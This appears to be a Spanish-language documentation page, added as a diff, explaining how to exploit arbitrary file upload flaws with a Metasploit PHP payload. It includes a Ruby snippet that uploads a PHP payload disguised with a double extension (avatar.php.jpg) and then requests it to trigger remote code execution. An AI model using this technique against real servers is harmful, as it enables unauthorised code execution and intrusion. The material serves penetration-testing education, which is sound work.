@@ -1,0 +1,23 @@
+---
+title: "Cómo usar PhpEXE para explotar un fallo de carga de archivos arbitraria"
+description: Generar un payload PHP disfrazado para subir a formularios sin validación de extensión.
+---
+
+Un patrón muy común en aplicaciones web mal configuradas es permitir la subida de archivos **sin validar correctamente la extensión o el tipo de contenido**. Si el servidor ejecuta PHP y el directorio de subidas es accesible por HTTP, subir un archivo `.php` con el payload es suficiente para lograr ejecución remota de código.
+
+Metasploit genera este tipo de payload con las utilidades de `Msf::Util::EXE` orientadas a PHP, produciendo un archivo que, aunque tenga una extensión "disfrazada" (por ejemplo `.php.jpg`, si el filtro del objetivo solo revisa la última extensión de forma ingenua), sigue siendo interpretado como PHP por el servidor.
+
+```ruby
+php_payload = Msf::Util::EXE.to_exe_php(payload.encoded)
+
+res = send_request_cgi(
+  'method'   => 'POST',
+  'uri'      => '/upload.php',
+  'data'     => multipart_body_con(php_payload, filename: 'avatar.php.jpg')
+)
+
+# Luego se visita la URL donde quedó guardado el archivo para disparar la ejecución
+send_request_cgi('uri' => '/uploads/avatar.php.jpg')
+```
+
+El paso crítico para que el exploit funcione no es solo generar el payload, sino **descubrir la ruta real** donde el servidor guardó el archivo subido — muchas aplicaciones renombran el archivo o lo mueven a una carpeta no obvia.
